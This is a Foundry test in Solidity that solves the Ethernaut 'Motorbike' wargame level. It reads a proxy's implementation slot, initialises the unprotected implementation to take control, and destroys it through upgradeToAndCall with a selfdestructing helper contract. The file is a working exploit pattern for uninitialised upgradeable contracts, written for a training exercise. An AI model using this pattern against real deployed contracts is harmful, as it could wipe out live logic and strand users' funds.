// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level25 {
    function initialize() external;
    function upgradeToAndCall(address, bytes memory) external;
}

contract DestroyEngine {
    address immutable engine;
    address immutable owner;

    event WillSelfDestruct(address, address);

    constructor(address _engine, address _owner) {
        engine = _engine;
        owner = _owner;
    }

    fallback() external {
        if (address(this) == engine) {
            emit WillSelfDestruct(address(this), owner);
            selfdestruct(payable(owner));
        }
    }
}

contract Level25Test is EthernautTest {
    event WillSelfDestruct(address, address);

    function testLevel25() public {
        _createLevel("25");

        Level25 level25Instance = Level25(levelInstance["25"]);

        // Lets load the address of the implementation contract
        address engine = address(
            uint160(
                uint256(
                    vm.load(
                        address(level25Instance), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                    )
                )
            )
        );

        // Can we can call initialize on the engine contract and become the admin
        Level25(engine).initialize();

        // Lets create a contract which will selfdestruct engine
        DestroyEngine destroyEngine = new DestroyEngine(engine, address(this));

        // Instead of our standard require _submitLevel statement
        // We should test that the event was called before selfdestruct
        vm.expectEmit(true, true, false, false);
        emit WillSelfDestruct(address(engine), address(this));

        // Then call upgradeToAndCall to destruct the engine contract
        // We need to set the data > 0
        Level25(engine).upgradeToAndCall(address(destroyEngine), hex"01");

        // Our default test require won't work as the code is only deleted
        // after the whole transaction completes
        // Each foundry test occurs entirely within a transaction
        // require(_submitLevel("25"));
    }

    receive() external payable {}
}
